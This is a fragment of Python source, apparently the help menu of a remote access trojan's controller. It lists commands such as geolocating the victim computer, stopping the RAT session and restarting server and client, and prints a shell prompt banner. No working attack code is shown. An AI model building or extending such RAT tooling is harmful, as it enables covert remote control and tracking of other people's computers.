...
geolocate                 get location of computer                                                  (don't working)
...
stop                      terminate the session of RAT and server
exit                      close window server. (doesn't terminate the server)
restart                   restart of a server and client
''')
        print("======================================================")
        print("Shell: ")
        print("======================================================")
